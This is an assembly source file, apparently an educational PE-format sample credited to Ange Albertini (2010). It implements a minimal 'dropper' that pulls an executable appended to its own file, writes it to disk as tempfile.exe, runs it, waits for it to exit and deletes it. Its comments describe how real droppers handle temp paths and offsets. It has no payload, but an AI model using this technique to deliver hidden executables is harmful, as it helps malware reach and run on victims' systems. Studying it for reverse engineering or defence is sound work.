;minimalist appended-data dropper. reads itself in a buffer, writes it to file, executes it.

%include '..\..\standard_hdr.asm'

EntryPoint:
    push PAGE_READWRITE     ; DWORD flProtect
    push MEM_COMMIT         ; DWORD flAllocationType
    push EMBEDDED_FILESIZE  ; SIZE_T dwSize
    push 0                  ; LPVOID lpAddress
    call VirtualAlloc
    mov [lpBuffer], eax

    push 0                  ; hTemplateFile
    push 0                  ; dwFlagsAndAttributes
    push OPEN_EXISTING      ; dwCreationDisposition
    push 0                  ; lpSecurityAttributes
    push FILE_SHARE_READ    ; dwShareMode
    push GENERIC_READ       ; dwDesiredAccess
    ; typically, the filename is obtained via could do something smarter via GetCommandLineA
    push dropper            ; lpFileName
    call CreateFileA
    mov [hFile], eax

    push FILE_BEGIN                 ; DWORD dwMoveMethod
    push 0                          ; PLONG lpDistanceToMoveHigh
    ; typically, file offset to read is calculated and not hard-coded
    push embedded_file - IMAGEBASE  ; LONG lDistanceToMove
    push dword [hFile]              ; HANDLE hFile
    call SetFilePointer

    push 0                  ; LPOVERLAPPED lpOverlapped
    push lpNumberOfBytes    ; LPDWORD lpNumberOfBytesRead
    push EMBEDDED_FILESIZE  ; DWORD nNumberOfBytesToRead
    push dword [lpBuffer]   ; LPVOID lpBuffer
    push dword [hFile]      ; HANDLE hFile
    call ReadFile

    push dword [hFile]    ; hObject
    call CloseHandle

    push 0                            ; hTemplateFile
    push 0                            ; dwFlagsAndAttributes
    push CREATE_NEW                   ; dwCreationDisposition
    push 0                            ; lpSecurityAttributes
    push FILE_SHARE_READ              ; dwShareMode
    push GENERIC_READ | GENERIC_WRITE ; dwDesiredAccess
    ; typically droppers create a file in the temporary directory, for example via GetTempPath
    push tempfile                     ; lpFileName
    call CreateFileA
    mov [hFile], eax

    push 0                      ; lpOverLapped
    push lpNumberOfBytes        ; lpNumberOfBytesWritten
    push EMBEDDED_FILESIZE      ; nNumberOfBytesToWrite
    push dword [lpBuffer]       ; lpBuffer
    push dword [hFile]          ; hFile
    call WriteFile

    push dword [hFile]    ; hObject
    call CloseHandle

    push MEM_RELEASE        ; DWORD dwFreeType
    push 0                  ; SIZE_T dwSize
    push dword [lpBuffer]   ; LPVOID lpAddress
    call VirtualFree

    push lpProcessInformation   ; lpProcessInformation
    push lpStartupInfo          ; lpStartupInfo
    push 0                      ; lpCurrentDirectory
    push 0                      ; lpEnvironment
    push 0                      ; dwCreationFlags
    push 0                      ; bInheritHandles
    push 0                      ; lpThreadAttributes
    push 0                      ; lpProcessAttributes
    push 0                      ; lpCommandLine
    push tempfile               ; lpApplicationName
    call CreateProcessA

    ; waiting for the thread to end
    push -1                                                         ; DWORD dwMilliseconds
    push dword [lpProcessInformation + PROCESS_INFORMATION.hThread] ; HANDLE hHandle
    call WaitForSingleObject

    ; repeatedly try and delete the file
delete_loop:
    push tempfile              ; lpFileName
    call DeleteFileA
    test eax, eax
    jz delete_loop

    push 0                      ; uExitCode
    call ExitProcess

;%IMPORT kernel32.dll!VirtualAlloc
;%IMPORT kernel32.dll!VirtualFree

;%IMPORT kernel32.dll!CreateFileA
;%IMPORT kernel32.dll!SetFilePointer
;%IMPORT kernel32.dll!ReadFile
;%IMPORT kernel32.dll!WriteFile
;%IMPORT kernel32.dll!CloseHandle
;%IMPORT kernel32.dll!DeleteFileA

;%IMPORT kernel32.dll!CreateProcessA
;%IMPORT kernel32.dll!WaitForSingleObject

;%IMPORT kernel32.dll!ExitProcess

SIZEOFCODE equ $ - base_of_code

;%IMPORTS

align 16, db 0
base_of_data:

dropper db 'dropper.exe' , 0
tempfile db 'tempfile.exe', 0

align 16, db 0
lpBuffer dd 0
hFile dd 0
lpNumberOfBytes dd 0


align 16, db 0
lpStartupInfo istruc STARTUPINFO
iend

align 16, db 0
lpProcessInformation istruc PROCESS_INFORMATION
iend
SIZEOFINITIALIZEDDATA equ $ - base_of_data

uninit_data equ IMAGEBASE
SIZEOFUNINITIALIZEDDATA equ 0
Section0Size EQU $ - Section0Start
align FILEALIGN,db 0
SIZEOFIMAGE EQU $ - IMAGEBASE

; appended data from here
embedded_file:
incbin '..\compiled.exe'
EMBEDDED_FILESIZE equ $ - embedded_file

;Ange Albertini, Creative Commons BY, 2010